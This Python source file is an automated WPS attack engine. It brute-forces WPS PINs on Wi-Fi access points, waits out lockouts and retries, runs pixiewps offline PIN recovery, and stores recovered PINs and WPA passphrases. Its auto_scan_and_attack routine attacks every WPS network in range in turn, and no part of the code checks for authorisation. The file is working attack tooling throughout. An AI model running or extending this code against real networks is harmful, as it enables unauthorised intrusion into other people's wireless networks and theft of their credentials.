#!/usr/bin/env python3
"""
Auto-WPS Engine
- Monitors WPS lock status
- Automatically retries when lock clears
- Runs continuous attack cycle
- Supports all attack types
"""

import re
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from modules.wpa_engine import WpsEngine
from modules.wps_pins import suggest_pins


class AutoWPS:
    """Automated WPS attack with lock monitoring and auto-retry"""

    def __init__(self, interface, db=None):
        self.interface = interface
        self.db = db
        self.running = False
        self.results = []
        self.callback = None

    def _run_command(self, command, timeout):
        """Run a short-lived command safely."""
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
        except Exception as exc:
            self._log("Command failed: {err}".format(err=str(exc)))
            return None
        return result

    def _success_fields(self, result):
        """Return verified PIN/PSK only for a real success result."""
        if not isinstance(result, dict):
            return None, None
        if result.get("status") != "success":
            return None, None
        pin = result.get("pin")
        psk = result.get("psk")
        if not pin or not psk:
            return None, None
        return pin, psk

    def _record_attempt(self, bssid, pin, result, duration):
        """Persist one PIN attempt in the resume database when available."""
        if not self.db or not pin:
            return
        response = ""
        if isinstance(result, dict):
            response = result.get("output", "")[-500:]
            status = result.get("status", "unknown")
        else:
            status = "unknown"
        try:
            self.db.record_wps_attempt(
                bssid=bssid,
                pin=pin,
                status=status,
                response=response,
                duration=duration,
            )
        except Exception as exc:
            self._log("Attempt save failed: {err}".format(err=str(exc)))

    def auto_attack(self, bssid, essid="", max_cycles=100, lock_wait=60,
                    skip_pins=None):
        """
        Automated WPS attack cycle:
        1. Try best PINs
        2. If locked or M2D → wait and monitor
        3. When unlocked → continue with pending PINs
        4. Repeat until success or max cycles
        """
        self.running = True
        self.results = []

        pins = suggest_pins(bssid)
        pin_list = []
        for pin_info in pins:
            candidate_pin = pin_info.get("pin")
            if candidate_pin and candidate_pin not in pin_list:
                pin_list.append(candidate_pin)

        tried_pins = set(skip_pins or [])
        if self.db:
            try:
                tried_pins.update(self.db.get_attempted_wps_pins(bssid))
            except Exception as exc:
                self._log("Resume load failed: {err}".format(err=str(exc)))

        pending_pins = []
        for candidate_pin in pin_list:
            if candidate_pin in tried_pins:
                continue
            pending_pins.append(candidate_pin)

        self._log("Target: {essid} ({bssid})".format(essid=essid, bssid=bssid))
        self._log("PINs available: {count}".format(count=len(pin_list)))
        self._log("PINs pending: {count}".format(count=len(pending_pins)))
        self._log("Max cycles: {count}".format(count=max_cycles))
        self._log("Lock wait: {seconds}s".format(seconds=lock_wait))
        self._log("")

        if not pending_pins:
            self._log("No pending PINs remain in resume database")
            self.running = False
            return {"status": "completed", "attempted_pin": None}

        cycle = 0
        pin_index = 0
        last_result = {"status": "completed", "attempted_pin": None}

        while self.running and cycle < max_cycles:
            if pin_index >= len(pending_pins):
                self._log("All pending PINs were tried once")
                self.running = False
                return last_result

            cycle += 1
            pin = pending_pins[pin_index]
            self._log("=== Cycle {cycle}/{max_cycles} | PIN: {pin} ===".format(
                cycle=cycle,
                max_cycles=max_cycles,
                pin=pin,
            ))

            engine = WpsEngine(self.interface)
            ok, message = engine.start()
            if not ok:
                self._log("Engine error: {msg}".format(msg=message))
                time.sleep(5)
                continue

            engine.callback = self._engine_callback
            started = time.time()
            try:
                result = engine.wps_pin_attack(bssid, pin, timeout=45)
            except Exception as exc:
                self._log("Error: {err}".format(err=str(exc)))
                result = {
                    "status": "error",
                    "pin": None,
                    "attempted_pin": pin,
                    "psk": None,
                    "output": str(exc),
                }
            finally:
                engine.stop()
            elapsed = time.time() - started
            self._record_attempt(bssid, pin, result, elapsed)

            last_result = result
            status = result.get("status", "unknown")
            if status == "success":
                verified_pin, verified_psk = self._success_fields(result)
                if verified_pin and verified_psk:
                    self._log("")
                    self._log("=" * 50)
                    self._log("SUCCESS! PIN: {pin}".format(pin=verified_pin))
                    self._log("PSK: {psk}".format(psk=verified_psk))
                    self._log("=" * 50)
                    self._save_result(bssid, essid, result)
                    self.running = False
                    return result
                self._log("Success status without verified credentials; ignoring result")
                pin_index += 1

            elif status == "locked":
                self._log("LOCKED. Waiting {seconds}s before retrying same PIN...".format(
                    seconds=lock_wait
                ))
                self._wait_with_countdown(lock_wait)
                continue

            elif status == "m2d_rejected":
                self._log("M2D rejection/busy registrar. Waiting {seconds}s...".format(
                    seconds=lock_wait
                ))
                self._wait_with_countdown(lock_wait)
                continue

            elif status == "wrong_pin":
                self._log("Wrong PIN. Moving to next pending candidate...")
                pin_index += 1

            elif status == "timeout":
                self._log("Timeout. Retrying same PIN after short wait...")
                self._wait_with_countdown(min(lock_wait, 10))
                continue

            elif status == "data_collected":
                pixie = result.get("pixie_data", {})
                collected = 0
                for key, value in pixie.items():
                    if key == "BSSID":
                        continue
                    if value:
                        collected += 1
                self._log("Collected {count}/7 data fields".format(count=collected))
                if collected >= 4:
                    self._log("Enough data for pixiewps candidate search")
                    pixie_pin = self._try_pixiewps(bssid, pixie)
                    if pixie_pin:
                        self._log("PIXIEWPS candidate PIN: {pin}".format(pin=pixie_pin))
                        verify = self._verify_pin(bssid, pixie_pin)
                        if verify:
                            verified_pin, verified_psk = self._success_fields(verify)
                            if verified_pin and verified_psk:
                                self._log("PIN VERIFIED!")
                                self._save_result(bssid, essid, verify)
                                self.running = False
                                return verify
                pin_index += 1

            else:
                self._log("Status {status}. Moving to next PIN...".format(status=status))
                pin_index += 1

            time.sleep(2)

        self._log("Max cycles ({count}) reached".format(count=max_cycles))
        self.running = False
        return last_result

    def auto_scan_and_attack(self, scanner_func=None, max_targets=10):
        """
        Continuously scan and attack WPS networks:
        1. Scan for networks
        2. Find open WPS targets
        3. Attack each one
        4. Repeat
        """
        self.running = True
        attacked = set()

        while self.running:
            self._log("=== Scanning for WPS networks... ===")
            if scanner_func:
                networks = scanner_func(self.interface)
            else:
                networks = self._quick_scan()

            wps_nets = [network for network in networks if network.get("has_wps")]
            self._log("Found {count} WPS networks".format(count=len(wps_nets)))

            for net in wps_nets[:max_targets]:
                if not self.running:
                    break

                bssid = net["bssid"]
                if bssid in attacked:
                    continue

                essid = net.get("essid", "Unknown")
                lock = net.get("wps_locked", "Unknown")
                self._log("\nTarget: {essid} ({bssid}) Lock:{lock}".format(
                    essid=essid,
                    bssid=bssid,
                    lock=lock,
                ))

                if lock == "Yes":
                    self._log("Locked target detected; monitoring behavior only")
                elif lock == "No":
                    self._log("Open WPS reported by latest scan")

                result = self.auto_attack(bssid, essid, max_cycles=20)
                attacked.add(bssid)
                if result.get("status") == "success":
                    self._log("CREDENTIALS FOUND for {essid}!".format(essid=essid))

            self._log("\nWaiting 60s before next scan...")
            self._wait_with_countdown(60)

    def monitor_lock(self, bssid, timeout=3600):
        """
        Monitor WPS lock status over time.
        Tries one PIN periodically to check if lock has cleared.
        """
        self.running = True
        start_time = time.time()
        self._log("Monitoring WPS lock on {bssid}".format(bssid=bssid))
        self._log("Will try PIN every 30s to detect unlock")
        self._log("")

        attempt = 0
        while self.running and (time.time() - start_time) < timeout:
            attempt += 1
            elapsed = int(time.time() - start_time)
            engine = WpsEngine(self.interface)
            ok, message = engine.start()
            if not ok:
                self._log("Engine error: {msg}".format(msg=message))
                self._wait_with_countdown(10)
                continue

            engine.callback = self._engine_callback
            probe_pin = "12345670"
            started = time.time()
            try:
                result = engine.wps_pin_attack(bssid, probe_pin, timeout=20)
            except Exception as exc:
                result = {
                    "status": "error",
                    "pin": None,
                    "attempted_pin": probe_pin,
                    "psk": None,
                    "output": str(exc),
                }
            finally:
                engine.stop()
            elapsed_attempt = time.time() - started
            self._record_attempt(bssid, probe_pin, result, elapsed_attempt)

            status = result.get("status")
            self._log("[{seconds}s] Attempt {attempt}: {status}".format(
                seconds=elapsed,
                attempt=attempt,
                status=status,
            ))

            if status == "success":
                verified_pin, verified_psk = self._success_fields(result)
                if verified_pin and verified_psk:
                    self._save_result(bssid, "", result)
                return result

            if status == "wrong_pin":
                self._log("Lock appears cleared; starting full authorized attack workflow")
                return self.auto_attack(bssid)

            if status == "locked":
                self._wait_with_countdown(30)
                continue

            if status == "m2d_rejected":
                self._log("Registrar still deferred the session; continuing monitor")
                self._wait_with_countdown(30)
                continue

            self._log("No clear unlock signal yet; continuing monitor")
            self._wait_with_countdown(30)

        self._log("Monitor timeout reached")
        return {"status": "timeout", "attempted_pin": None}

    def _try_pixiewps(self, bssid, pixie_data):
        """Run pixiewps with collected data and return a candidate PIN."""
        import shutil
        if not shutil.which("pixiewps"):
            self._log("pixiewps not installed!")
            return None

        cmd = [
            "pixiewps",
            "--pke", pixie_data.get("PKE", ""),
            "--pkr", pixie_data.get("PKR", ""),
            "--e-hash1", pixie_data.get("E_HASH1", ""),
            "--e-hash2", pixie_data.get("E_HASH2", ""),
            "--authkey", pixie_data.get("AUTHKEY", ""),
            "--e-nonce", pixie_data.get("E_NONCE", ""),
            "--r-nonce", pixie_data.get("R_NONCE", ""),
            "--e-bssid", bssid.replace(":", ""),
            "--mode", "1,2,3,4,5",
            "--force",
        ]
        cmd = [value for value in cmd if value]
        result = self._run_command(cmd, 120)
        if result is None:
            return None
        self._log(result.stdout)
        if result.returncode != 0:
            return None
        for line in result.stdout.split("\n"):
            if "WPS pin" not in line or "[+]" not in line:
                continue
            pin = line.split(":")[-1].strip()
            if pin and pin != "<empty>":
                return pin
        return None

    def _verify_pin(self, bssid, pin):
        """Verify a PIN by trying a real WPS exchange."""
        self._log("Verifying PIN: {pin}".format(pin=pin))
        engine = WpsEngine(self.interface)
        ok, message = engine.start()
        if not ok:
            self._log("Verify engine error: {msg}".format(msg=message))
            return None

        engine.callback = self._engine_callback
        started = time.time()
        try:
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
        except Exception as exc:
            result = {
                "status": "error",
                "pin": None,
                "attempted_pin": pin,
                "psk": None,
                "output": str(exc),
            }
        finally:
            engine.stop()
        elapsed = time.time() - started
        self._record_attempt(bssid, pin, result, elapsed)
        verified_pin, verified_psk = self._success_fields(result)
        if verified_pin and verified_psk:
            return result
        return None

    def _quick_scan(self):
        """Quick scan using iw."""
        command_up = ["ip", "link", "set", self.interface, "up"]
        result_up = self._run_command(command_up, 5)
        if result_up is None:
            return []
        time.sleep(1)

        command_scan = ["iw", "dev", self.interface, "scan"]
        result = self._run_command(command_scan, 20)
        if result is None:
            return []
        if result.returncode != 0:
            return []

        networks = []
        current = None
        for line in result.stdout.split("\n"):
            line = line.strip().lstrip("\t")
            match = re.match(r"BSS ([0-9a-fA-F:]{17})", line)
            if match:
                if current and current.get("has_wps"):
                    networks.append(current)
                current = {
                    "bssid": match.group(1).upper(),
                    "essid": "",
                    "channel": 0,
                    "rssi": 0,
                    "has_wps": 0,
                    "wps_locked": "Unknown",
                }
                continue
            if not current:
                continue
            match = re.match(r"SSID: (.*)", line)
            if match:
                current["essid"] = match.group(1).strip() or "Hidden"
            match = re.match(r"signal: ([+-]?[0-9.]+) dBm", line)
            if match:
                current["rssi"] = int(float(match.group(1)))
            match = re.match(r"freq: (\d+)", line)
            if match:
                freq = int(match.group(1))
                if 2412 <= freq <= 2484:
                    if freq == 2484:
                        current["channel"] = 14
                    else:
                        current["channel"] = (freq - 2412) // 5 + 1
            match = re.match(r"WPS:\t", line)
            if match:
                current["has_wps"] = 1
            match = re.search(r"AP setup locked: (0x[0-9a-fA-F]+)", line)
            if match:
                value = int(match.group(1), 16)
                current["wps_locked"] = "Yes" if value else "No"

        if current and current.get("has_wps"):
            networks.append(current)
        networks.sort(key=lambda item: item["rssi"], reverse=True)
        return networks

    def _wait_with_countdown(self, seconds):
        """Wait with countdown display."""
        for remaining in range(seconds, 0, -1):
            if not self.running:
                break
            minutes, sec = divmod(remaining, 60)
            message = "\r  Waiting: {minutes:02d}:{seconds:02d} ".format(
                minutes=minutes,
                seconds=sec,
            )
            sys.stdout.write(message)
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\r                      \r")

    def _engine_callback(self, line):
        """Forward engine output."""
        if self.callback:
            self.callback(line)

    def _log(self, message):
        """Log message."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        full_message = "[{time}] {msg}".format(time=timestamp, msg=message)
        if self.callback:
            self.callback(full_message)
        else:
            print(full_message)

    def _save_result(self, bssid, essid, result):
        """Save a verified successful result."""
        verified_pin, verified_psk = self._success_fields(result)
        if not verified_pin or not verified_psk:
            self._log("Refused to save unverified credential result")
            return

        self.results.append({
            "bssid": bssid,
            "essid": essid,
            "pin": verified_pin,
            "psk": verified_psk,
            "time": datetime.now().isoformat(),
        })
        if self.db:
            self.db.add_credential(
                bssid,
                essid,
                verified_pin,
                verified_psk,
                "Auto-WPS",
            )
            self.db.execute(
                "UPDATE networks SET status='compromised' WHERE bssid=?",
                (bssid,),
            )

    def stop(self):
        """Stop all operations."""
        self.running = False
